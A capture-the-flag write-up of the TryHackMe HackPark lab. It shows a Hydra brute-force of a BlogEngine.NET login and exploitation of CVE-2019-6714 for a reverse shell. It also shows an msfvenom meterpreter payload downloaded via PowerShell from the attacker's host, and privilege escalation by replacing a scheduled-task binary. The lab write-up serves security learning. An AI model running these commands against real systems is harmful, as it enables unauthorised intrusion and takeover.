
# HackPark CTF Write-Up
# Challenge Title: HackPark

## Platform
TryHackMe

## Difficulty
Medium

## Description
Bruteforce a website's login with Hydra, identify and use a public exploit, then escalate your privileges on this Windows machine!

## Tools and Techniques Used
- Hydra
- Burp Suite
- Metasploit
- WinPEAS
- Linux commands (e.g., `ls`, `cat`)
- SSH
- Python script

## Step-by-Step Solution
**IP Addresses:**
- My IP address: 10.10.50.107
- Target machine IP address: 10.10.144.62

## Task 1: Deploy the Vulnerable Windows Machine

1. **Deploy the Machine:**
   After deploying the vulnerable Windows machine, I accessed its web server.

  ![HackParkScreenShot1](https://github.com/user-attachments/assets/d05c8d98-3cea-470e-be76-f5627615299d)

2. **Identify the Clown on the Homepage:**
   By examining the source code of the website, I found a clown image link locate at: http://<IP>image.axd?picture=/26572c3a-0e51-4a9f-9049-b64e730ca75d.jpg
   I performed a reverse image search using Google and discovered that the clown's name is **Pennywise**.
![HackParkScreen2 0](https://github.com/user-attachments/assets/db3a1e3b-7f27-4fc0-8a8d-0a085848e704)
![HackParkScreen2](https://github.com/user-attachments/assets/063521ef-9b36-47e7-a01b-e9e8f5cca08e)

## Task 2: Brute-Forcing Login with Hydra

In the next step, I needed to brute-force the login using **Hydra**.

1. **Intercept the Request:**
   Using Burp Suite, I intercepted the request from the **Sign In** action.
![HackPark3](https://github.com/user-attachments/assets/c5a9b3bf-1ab6-4fd9-b0fb-f4fc20a83290)

   - **Request Type:** The login form uses the **POST** request type.

2. **Brute-Force Credentials:**
   With the request information, I executed the following command to find the credentials:

   ```
   hydra -l admin -P rockyou.txt 10.10.144.62 http-post-form "/Account/login.aspx?ReturnURL=admin:__VIEWSTATE=Bjdg0T4vJInmW5tUM8x5txmfsq8hz6JGO83P0kbnaJq966zSeFeDAxLS%2BXyw4U4S%2FgpkPbUDHuPw14Mx2Q2QJRFxJ7kenDSk54xKXAp9wDV4gVOW3yEZCH93n0756GyaZ8EyMi58wMwEivOw0zpcHO8xp8e%2Bj32e7h3iv5zKqryGFUPE&__EVENTVALIDATION=31Qm85XIxQI11Fi3HPbRUY6kn21c%2F0zPSqk2UvIRBUu1Tt4QS4oLN1VfqrwJsGOUA5SWiSRdcq5xSwvpOpMlWpc%2FfuQa%2BRGsBlT0juZD%2BREOwscUWk%2BwRvwxsVfiEUUV6Hu35MTQshjrc21mdMKy7m8SMyNHNImtbJDftdJDzqYsNqF7&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
   ```
![HackPark4](https://github.com/user-attachments/assets/37e9ff25-9ea6-43fb-b836-6e2f0d59f505)

   - I successfully found the password **1qaz2wsx**. The username was already evident in the source code, as it is the default credential for this blogengine.net.

3. **Hydra Capabilities:**
   Hydra is versatile, capable of brute-forcing various protocols beyond HTTP forms, including FTP, SSH, SMTP, and SMB.

## Task 3: Compromise the Machine

1. **Login to the Application:**
   Using the credentials `admin:1qaz2wsx`, I logged into the application and identified the version of blogengine.net being used, which is vulnerable to **CVE-2019-6714** due to path traversal vulnerabilities.

![HackPark5](https://github.com/user-attachments/assets/912d9863-3bb2-4c02-967c-6797c39a4fe8)

2. **Exploit Research:**
   I found an exploit for this vulnerability on Exploit-DB:
   [Exploit DB - CVE-2019-6714](https://www.exploit-db.com/exploits/46353).

3. **Upload Malicious File:**
   After editing the exploit with the correct attacker IP address and renaming the file appropriately, I uploaded it under the **Content Posts** section of blogengine:
![HackPark6](https://github.com/user-attachments/assets/c8ce9370-8849-49e8-ac77-aedc86bf4f7a)

![HackPark7](https://github.com/user-attachments/assets/b3b2275e-ad7e-4c06-8cb9-7d77ba240329)

4. **Set Up a Listener:**
   I configured a listener to catch the reverse shell.
![HackPark8](https://github.com/user-attachments/assets/307ea096-37b1-4622-a581-4147c3f0c068)


5. **Accessing the File:**
   Using a web browser, I navigated to the location of the uploaded file:

![HackPark9](https://github.com/user-attachments/assets/a81efce8-5eb8-4d9c-b2d0-c9e599219f4f)


   - This action successfully yielded a reverse shell.
![HackPark10](https://github.com/user-attachments/assets/8bb2689c-3948-4efb-9e33-bb5dee4e2ec6)

6. **Web Server User:**
   The final question was, **Who is the web server running as?** The answer is **iis apppool\blog**.

## Task 4: Windows Privilege Escalation

1. **Reverse Shell with Msfvenom:**
   I created another reverse shell using **msfvenom**:

   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.50.107 LPORT=4446 -f exe > reverse.exe
   ```
![HackPark10 0](https://github.com/user-attachments/assets/9b3c1e40-db48-434a-bedc-1e6ee60bfd35)


2. **Download Reverse Shell on Target:**
   Using PowerShell, I downloaded the reverse shell to the target machine:

   ```
   powershell -c wget "http://10.10.50.107:4448/reverse.exe" -outfile 'rev.exe'
   ```
![HackPark11](https://github.com/user-attachments/assets/a2475826-6a38-41dc-b430-b9942487654a)


3. **Configure Meterpreter:**
   I set up the Meterpreter session using Metasploit.
![MetaSploit1](https://github.com/user-attachments/assets/72bf2d24-1334-4011-a267-c4b8ffb44693)
![MetaSPloit2](https://github.com/user-attachments/assets/33aed50b-a42f-4181-8738-2cea88506f9c)
![MetaSploit3](https://github.com/user-attachments/assets/a30b0cd4-2e02-4888-8d3e-deb272fac578)



4. **OS Version:**
   I answered the following question regarding the OS version:
   - **What is the OS version of this Windows machine?**  
   Answer: **Windows 2012 R (6.3 Build 9600)**.

5. **Abnormal Service:**
   To find the abnormal service running, I performed further enumeration.
![UploadWinPeasReal](https://github.com/user-attachments/assets/962bf7bf-9ecd-4db9-829d-74d953b6525d)

6. **Open Shell and Run WinPEAS:**
   I opened a shell and executed **winPEAS**:
![Openning a shell](https://github.com/user-attachments/assets/9c3f20a8-1a88-430f-be71-4deed59fedc3)
![WinPEAS1](https://github.com/user-attachments/assets/f5fbed97-dc53-4634-a83c-afb16a67e836)


   - The answer to the question, **What is the name of the abnormal service running?** is **WindowsScheduler**.

7. **Exploit the Abnormal Service:**
   I located a suspicious file:
   - **File Path:** `c:\Program Files (x86)\SystemScheduler\Events\20198415519.INI_LOG.txt`.

   - **What is the name of the binary you're supposed to exploit?**  
   Answer: **Message.exe**.

8. **Final Reverse Shell:**
   To escalate privileges, I created another TCP reverse shell, renaming it to **Message.exe** to run with administrator privileges.
![GettingRoot](https://github.com/user-attachments/assets/2addff4f-43f8-42fa-bcc2-5ba9df3e6530)


   - This resulted in root access on the box:
![Whoami](https://github.com/user-attachments/assets/c0ee0dd6-08b8-4415-8b78-561c2deb2f55)


9. **Capture Flags:**
   I retrieved the flags:
   - **Flag for Jeff:**
  
![FlagJeff](https://github.com/user-attachments/assets/a3dd2257-fcd1-49d7-bd7b-a5fef17ef07d)

   - **Root Flag:**

![Root](https://github.com/user-attachments/assets/81ff9633-9e01-435e-b3f6-4b940585fbec)

   - **System Information:**
![DateWithLinPEAS](https://github.com/user-attachments/assets/bfb1ffa1-f2fa-408b-8bea-109b1ac19702)

![SystemInfoAdmin](https://github.com/user-attachments/assets/ee4377a3-dcd9-471b-ac89-772735e88242)

   - **Original Install Time:**
     - Using **winPEAS**, the original install time was found to be **8/3/2019, 10:43:23 AM**.
